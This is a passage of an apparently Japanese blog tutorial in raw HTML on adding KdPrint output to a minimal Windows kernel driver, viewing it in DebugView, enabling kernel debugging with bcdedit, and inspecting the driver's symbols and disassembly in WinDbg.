2r5SVqNY32JiVqos71iHr/d+RqtZokEDoJPUWo8/kcs9lMvs3Ly8v/7ZVKJf5UhaqqctY0DS57wdXVNa6vWdgaDR3TxGqxwAUvirBteiUaghiDIODrsRBQGvFiFBJWGIW4V+a6qmmycQiyG0I+sw4viZHSI9UwoNLjJp/egAQWbUqzCSeKsOCZMiUSd2r8qVirhPD8W8hfnz+H+uoV3N1d2FtbKL98ieqbNzDfv4e1uYnG27dyT8zO9jYKjx7hmDh79gyKuPvuHZPoyTYniHM1Hna4mR0dIfz4EQ0ear54IedoZwc2ibSnT2G8fo0hv8skqzx+DFXg4UPUNjZk8i6o8ZI9MVelfn1q8G/IFYbTYLgaQ5oySc5wiDJlaNOLCxEy5ajwjkY0HLa7fl/Wquw1QsMaRRWii5HRIL4N6iKSMWNdCVu9WpXzkhlXFQXVSkVCJEbYRCP+puHp6SlOTk5k6VRpFN+i7hqNhkSxWET+KI98oYAKSYRNoERiRSlzXeS5Jkx63OaT/Qd/JJ8rm+28SgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/92071d128e5860eb218f94bc82b0ce0b/8ac56/image-60.webp 240w,
/static/92071d128e5860eb218f94bc82b0ce0b/d3be9/image-60.webp 480w,
/static/92071d128e5860eb218f94bc82b0ce0b/4cb1e/image-60.webp 786w&quot;
              sizes=&quot;(max-width: 786px) 100vw, 786px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/92071d128e5860eb218f94bc82b0ce0b/8ff5a/image-60.png 240w,
/static/92071d128e5860eb218f94bc82b0ce0b/e85cb/image-60.png 480w,
/static/92071d128e5860eb218f94bc82b0ce0b/321ea/image-60.png 786w&quot;
            sizes=&quot;(max-width: 786px) 100vw, 786px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/92071d128e5860eb218f94bc82b0ce0b/321ea/image-60.png&quot;
            alt=&quot;image-60.png&quot;
            title=&quot;image-60.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;画像の通り、作成したドライバモジュールがロードされていることが確認できます。&lt;/p&gt;
&lt;h3 id=&quot;kdprintマクロを追加する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#kdprint%E3%83%9E%E3%82%AF%E3%83%AD%E3%82%92%E8%BF%BD%E5%8A%A0%E3%81%99%E3%82%8B&quot; aria-label=&quot;kdprintマクロを追加する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;KdPrintマクロを追加する&lt;/h3&gt;
&lt;p&gt;次に、デバイスドライバにPrintメソッドを追加します。&lt;/p&gt;
&lt;p&gt;その前に、カーネルドライバの&lt;code class=&quot;language-text&quot;&gt;KdPrint&lt;/code&gt;の出力をDebugViewで拾えるようにするために、&lt;code class=&quot;language-text&quot;&gt;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager&lt;/code&gt;配下にサブキー[Debug Print Filter]を作成し、DWORD型のキー&lt;code class=&quot;language-text&quot;&gt;DEFAULT&lt;/code&gt;を追加して、値を1に設定します。&lt;/p&gt;
&lt;p&gt;※設定の反映にはOSの再起動が必要です。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 660px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/024db07d72761c7ed65f81cf9a321a17/1f083/image-64.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 124.58333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAZCAYAAAAxFw7TAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC/klEQVQ4y6WVSXPaQBCF+f+nXFIunwIHV8q55Z5U5RTH8YKNMZLQjpBAAiEJtKD1pWcAb7FTAU9VFxoB33TPvH7T+m168N0pNN1AEETIixJ5nmO9XqMoCqRpiqZpwEZd1zzYYO/qqkazm2+/ay2XEaIogufN4XsaLFOCphlQVQ1hGNEiAVzPQ7haoaI/sph4MyS0KFsmJ0iUJCjqBiXNW2VZMTxoMTSpClU8gzTUKNMcu2HLKoSfv7ByHIDA48GARzGfo6YFh5eXULpdrGnhFiurqioC1CgTHc6oD2+2wLYunpH7/Qecj0fwO22kp6dYdDpwjo/htzdz9swiOjnZAOu6QlFSyrGK+USC7bjIsowzy7JEtFw+ZNvg+Xg5fwDmxQZomz2IogJ5OKTqYn4wbC9Zts1bUT8+v8hQhqXfQBBkCLRHrutRpmt+aLuT3QW28XT+DMj2MF9ptIc9KIoBQ9d5OQ0dWBiGfwN3JT+ZPwHWVFqJskiRBXcwDQOWNYZDp7qiU42i5aHAHNniBpqqwB47lDUJmzT2asn/BSzXSP1rSMIA1timLsl4x4QHA4sNUCSgN5sjpnJZ670LmAU9WKMR4jh+1OG7gLSH1sikQ7FgmiOSjkt9PjsQmGdIvUvIImlwMkFKJQeLBXWOcwAwp54m5SW5BGFswSVBsxGTq9i2vSeQzIE6D7muYdz+gO7RJwjtL9A7nxEO7uGQi+wJLMnPCGjfYvrtK/yzcywvLoD7e4Qkcns63bdkypCZw9rA1NcwS3IE5Dbl1kDn5Ht7Azduo0CXzslpNCTxCjmJuiLZHKDDrdskGkz1GubI4dafJinXIbevfYAV20PKsIg1uLaA5SrlLcd+8BaweWFfD37I7J/5LrtT6lTDhOxLN8aYkA4ZjH0fBOGrwNcybrH9YeUtFvQ5k0nUXbqkFPi+z/WZkNvsMvzX2F2xLYGMoN/v4+b2Fr3eHY+rqyt06RYTRZFCgiRJGA5lMl66GmSF7E3j72VZ5tetNbJ4vzMj/gOlaYYc0p/6eQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/024db07d72761c7ed65f81cf9a321a17/8ac56/image-64.webp 240w,
/static/024db07d72761c7ed65f81cf9a321a17/d3be9/image-64.webp 480w,
/static/024db07d72761c7ed65f81cf9a321a17/cc661/image-64.webp 660w&quot;
              sizes=&quot;(max-width: 660px) 100vw, 660px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/024db07d72761c7ed65f81cf9a321a17/8ff5a/image-64.png 240w,
/static/024db07d72761c7ed65f81cf9a321a17/e85cb/image-64.png 480w,
/static/024db07d72761c7ed65f81cf9a321a17/1f083/image-64.png 660w&quot;
            sizes=&quot;(max-width: 660px) 100vw, 660px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/024db07d72761c7ed65f81cf9a321a17/1f083/image-64.png&quot;
            alt=&quot;image-64.png&quot;
            title=&quot;image-64.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;次に、デバイスドライバのコードを以下のように書き換え、ビルド後にデバイスドライバを再読み込みします。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c++&quot;&gt;&lt;pre class=&quot;language-c++&quot;&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;ntddk.h&amp;gt;

void FirstDriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);

	KdPrint((&amp;quot;This driver unloaded\n&amp;quot;));
}

extern &amp;quot;C&amp;quot;
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject-&amp;gt;DriverUnload = FirstDriverUnload;

	OSVERSIONINFOEXW osVersionInfo;
	NTSTATUS status = STATUS_SUCCESS;
	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
	status = RtlGetVersion((POSVERSIONINFOW)&amp;amp;osVersionInfo);

	KdPrint((&amp;quot;This is my first sample driver\n&amp;quot;));
	KdPrint((&amp;quot;OS version is : %d.%d.%d\n&amp;quot;, osVersionInfo.dwMajorVersion, osVersionInfo.dwMinorVersion, osVersionInfo.dwBuildNumber));

	return STATUS_SUCCESS;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここでは、&lt;code class=&quot;language-text&quot;&gt;KdPrint&lt;/code&gt;マクロを使って、現在のOSのバージョン情報を出力しています。&lt;/p&gt;
&lt;p&gt;OSのバージョン情報の取得には&lt;code class=&quot;language-text&quot;&gt;RtlGetVersion&lt;/code&gt;を使っています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlgetversion&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;RtlGetVersion function (wdm.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;取得した情報は&lt;code class=&quot;language-text&quot;&gt;OSVERSIONINFOEXW&lt;/code&gt;構造体として取得されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-osversioninfoa&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;OSVERSIONINFOA (winnt.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c++&quot;&gt;&lt;pre class=&quot;language-c++&quot;&gt;&lt;code class=&quot;language-c++&quot;&gt;typedef struct _OSVERSIONINFOA {
  DWORD dwOSVersionInfoSize;
  DWORD dwMajorVersion;
  DWORD dwMinorVersion;
  DWORD dwBuildNumber;
  DWORD dwPlatformId;
  CHAR  szCSDVersion[128];
} OSVERSIONINFOA, *POSVERSIONINFOA, *LPOSVERSIONINFOA;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;debugviewを設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#debugview%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;debugviewを設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DebugViewを設定する&lt;/h3&gt;
&lt;p&gt;SysInternalのDebugViewでKdprintマクロの出力を拾っていきます。&lt;/p&gt;
&lt;p&gt;まずはアプリケーションを起動し、[Caputure]から[Capture Kernel]と[Enable Verbose Output]を有効化します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 453px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f15f75aa75f9687bbf2686d7e50e4671/2108e/image-66.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 110.00000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAWCAYAAADAQbwGAAAACXBIWXMAAAsTAAALEwEAmpwYAAAD2ElEQVQ4y22VSW8bRxCF+TtzSW52HCXRVYl98A+wlZNgJIoMGIkudmxAt0DQvu8rF4mc4T5DcjgiRZHapZf6OiaDBGmgwJ6eqlevXlUPE0s7e6pWqqqFoeLmmRpRU/l8XoE9h2blclmNRkONekM3NzdiPTw86PHx8X8tUaqECqqhCsWypnd8/blb1GmxppKXUxxFqpZLymZOVDfwUr6gq14PRD3e3ztgrL/YJ1LJTc3MTGlmfkaTqa72g1iZalWpUkm5Wl3x7a0al5dq3T+oaQyj62t5xjiIz5ROpRTWalpbW9PBwYHa7bYShYKnZrOu0uTvqo79rODNG+VevZL/+rXyo6P2O6rQzs4mJnT29q1is2hsTNHysgKT58YSnJ+fO+t2u0q0L7q6a7VV/PIrzf70m/x3k/LHfzEbV/7XCcXvP6j18aPanz6p9eEPxVNTKrx4ocbLlyobo0qxqJqxBJCVaMSxrhp1+d8Na3w91lExVDKTViqbU8bzVLDyi0Eov1JR1GqpY0HhxoaiH5/Lq9eVTiblmR8NdBqGQaDOZU+pkR+08sU3yg19L//JE/lPv3ZWGvrWbMj2TxUMDysaGdHZs2dqWQWnluRwb09HR0cqGlPXZQB7BniQTCnl2Zjki/IzGXnptPKnpzpvNtX5bG3rettYVQsFNawpuVxOSWOYzWb/YRiZE/XvW6Zet6OoGcmzOaxYqVVLdn5xoY6JjV1gva7Kxoy5zOaySlvik5MTN68OsGqBtHtra0slO/R935WQy3kiWWCgDHb4edCx2HTnXcYqOTw8dKDg/F2yOQCYspnaMLFPrUzaTxlLS0vurGAl7u/vu+fNzU3t7Oxod3fX3Sj8/9UUxCTb9va2FhcXHXUWzuvr6y4YlsfHx5qfn3eV4Ms5sewZapI6hhXT48J0gjbOBPOCjDgRxBkJ8KERSIDuPbuGnU7HGXsHSGmUSAkLCwtOPxZaLttt4FpREqVOT09rdXV1oBtJkYqy2Q8Ygk4QYNDnBaVTDsH9BlAmPuwBohF91gMNYXJpl5/yYNEHJBESwJw9GtKUvob4kZRzwEv2MXEMYXZ1deU06gOSCe0Ag1HdhpmglZUVB8YZRiIqgPFgbACEIVoCyJDyAsaA40wVBJIEcMrrN4aZxNg7QALQkGDGpt8UEszNzTlGAKEfCSmRd8TxlUFDSJFo0OVr+6YBRIk48gIQgjmnKQjf145zgBin/mCzd02hRBiSfXZ21jmzcNqz+81wIz5ADDZ+AJOcRnCDSDpoCjPIurVPPc3hl3V3d+f+lLB7+//gHOOZX97/1wD8C7ehKnzFNI1QAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/f15f75aa75f9687bbf2686d7e50e4671/8ac56/image-66.webp 240w,
/static/f15f75aa75f9687bbf2686d7e50e4671/2430e/image-66.webp 453w&quot;
              sizes=&quot;(max-width: 453px) 100vw, 453px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/f15f75aa75f9687bbf2686d7e50e4671/8ff5a/image-66.png 240w,
/static/f15f75aa75f9687bbf2686d7e50e4671/2108e/image-66.png 453w&quot;
            sizes=&quot;(max-width: 453px) 100vw, 453px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/f15f75aa75f9687bbf2686d7e50e4671/2108e/image-66.png&quot;
            alt=&quot;image-66.png&quot;
            title=&quot;image-66.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これで、ツールバーのキャプチャボタンを押してキャプチャを開始した状態でサービスを起動すると、DebugViewでOSのバージョン情報を取得することができます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8a20c71a43fccf4a87343dbe533bf956/2bef9/image-67-1024x642.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 62.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAABy0lEQVQ4y52S20pCURCG1/aUhwRTEcsrL3yNyCwqoh6gCKLzgYiIniOIbrqJ7sIwJeoiqF4iEIWCgih129EySc2/NdMuysgOC35mZi/WN/+stcWlqkLNpJDJpJHNZpHL3SKXz8uYQ6FQ+LPE2ekp0qlzJBIJpC4uoKqvYMrzEvz4mOf4W4nDeBzq9TXiySSSR0c4PjnBze0dHuTmf5bIbG/j7uAAV7u7SO/s4H5vD/ubMaysrmF9PYzIZhTR2BYi0RgrvBGpKYFKBSiVgHIZz09P3GV0bBxCCNjr66HX6Ti3mM0w19VxXlMEqGgqEliuweERCEVBIBCAw+GAxWKB1+uFyWSCIr/rZBOFpGh6rxUNKF2SShpwfHKauzU1NjKMRDC9Xv9Lh1XAufkFmOR4Ho+HndntdpjlyDabDUajEQaDgWO1vnU4MzvHmy6Xi0cmEDkkp+SSRtZpI1KkBqRvgRNT03yHDRJGnekQuXW73XyQagJT/uUaPgLfHmVoZJQ3/X4/nE4nO/P5fDw65VarlWWTfwHVbw0ofgYWiwzs6x9gII374yPUepSy/BdpLS4to7mlFd09vejs6kaovQMtwRCCoTYEWz+oupZ6AewCe2nx8DgEAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/8a20c71a43fccf4a87343dbe533bf956/8ac56/image-67-1024x642.webp 240w,
/static/8a20c71a43fccf4a87343dbe533bf956/d3be9/image-67-1024x642.webp 480w,
/static/8a20c71a43fccf4a87343dbe533bf956/e46b2/image-67-1024x642.webp 960w,
/static/8a20c71a43fccf4a87343dbe533bf956/a9a89/image-67-1024x642.webp 1024w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/8a20c71a43fccf4a87343dbe533bf956/8ff5a/image-67-1024x642.png 240w,
/static/8a20c71a43fccf4a87343dbe533bf956/e85cb/image-67-1024x642.png 480w,
/static/8a20c71a43fccf4a87343dbe533bf956/d9199/image-67-1024x642.png 960w,
/static/8a20c71a43fccf4a87343dbe533bf956/2bef9/image-67-1024x642.png 1024w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/8a20c71a43fccf4a87343dbe533bf956/d9199/image-67-1024x642.png&quot;
            alt=&quot;image-67-1024x642.png&quot;
            title=&quot;image-67-1024x642.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;最後は、自作のドライバに対してWinDbgでカーネルデバッグを仕掛けてみます（ようやく本題）&lt;/p&gt;
&lt;h2 id=&quot;カーネルデバッグで自作ドライバを解析してみる&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%A7%E8%87%AA%E4%BD%9C%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%82%92%E8%A7%A3%E6%9E%90%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B&quot; aria-label=&quot;カーネルデバッグで自作ドライバを解析してみる permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルデバッグで自作ドライバを解析してみる&lt;/h2&gt;
&lt;p&gt;まずはカーネルデバッグを有効化します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;bcdedit &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;debug on
bcdedit &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;dbgsettings serial debugport:1 baudrate:115200
shutdown &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;r &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;t 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;詳しい設定方法は以下の記事にまとめてあります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-004-kernel-debug&quot;&gt;WinDbgでWindows10環境のカーネルデバッグを行う最初の一歩&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;カーネルデバッグの接続に成功したら、今回ビルドしたドライバのpdbファイルをSympathに追加します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sympath+ C:\Users\Tadpole01\source\repos\Try2WinDbg\drivers\FirstDriverSample\x64\Debug&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;モジュールの一覧を参照すると&lt;code class=&quot;language-text&quot;&gt;FirstDriverSample&lt;/code&gt;の存在が確認できます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;kd&gt; lm
&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;             &lt;span class=&quot;token keyword&quot;&gt;end&lt;/span&gt;                 module name
fffff800`64520000 fffff800`64527000   FirstDriverSample   &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
fffff801`74000000 fffff801`747cc000   nt         &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pdb symbols&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;          C:\ProgramData\Dbg\sym\ntkrnlmp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pdb\F7971FB6AA7E450CBCA7054A98D659421\ntkrnlmp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pdb
Unloaded modules:
fffff800`62c80000 fffff800`62c8f000   dump_storport&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sys
fffff800`62cc0000 fffff800`62ce5000   dump_storahci&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sys
fffff800`62d10000 fffff800`62d2c000   dump_dumpfve&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sys
fffff800`63400000 fffff800`63413000   dam&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sys 
fffff800`61ec0000 fffff800`61ed0000   WdBoot&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sys
fffff800`62ba0000 fffff800`62bae000   hwpolicy&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sys&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;シンボルがロードされているので、関数名も確認できます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;kd&gt; x &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;D &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;f FirstDriverSample!d*
fffff800`64521020 FirstDriverSample!DriverEntry &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;struct _DRIVER_OBJECT &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; struct _UNICODE_STRING &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
fffff800`645210f7 FirstDriverSample!DbgPrint &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DbgPrint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;uf&lt;/code&gt;コマンドでエントリ関数のディスアセンブル結果を見てみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;kd&gt; uf FirstDriverSample!DriverEntry
FirstDriverSample!DriverEntry &lt;span class=&quot;token namespace&quot;&gt;[C:\Users\Tadpole01\source\repos\Try2WinDbg\drivers\FirstDriverSample\FirstDriver.cpp @ 13]&lt;/span&gt;:
   13 fffff800`64521020 4889542410      mov     qword ptr &lt;span class=&quot;token namespace&quot;&gt;[rsp+10h]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;rdx
   13 fffff800`64521025 48894c2408      mov     qword ptr &lt;span class=&quot;token namespace&quot;&gt;[rsp+8]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;rcx
   13 fffff800`6452102a 4881ec68010000  sub     rsp&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;168h
   13 fffff800`64521031 488b05c81f0000  mov     rax&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;qword ptr &lt;span class=&quot;token namespace&quot;&gt;[FirstDriverSample!__security_cookie (fffff800`64523000)]&lt;/span&gt;
   13 fffff800`64521038 4833c4          xor     rax&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;rsp
   13 fffff800`6452103b 4889842450010000 mov     qword ptr &lt;span class=&quot;token namespace&quot;&gt;[rsp+150h]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;rax
   16 fffff800`64521043 488b842470010000 mov     rax&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;qword ptr &lt;span class=&quot;token namespace&quot;&gt;[rsp+170h]&lt;/span&gt;
   16 fffff800`6452104b 488d0daeffffff  lea     rcx&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token namespace&quot;&gt;[FirstDriverSample!FirstDriverUnload (fffff800`64521000)]&lt;/span&gt;
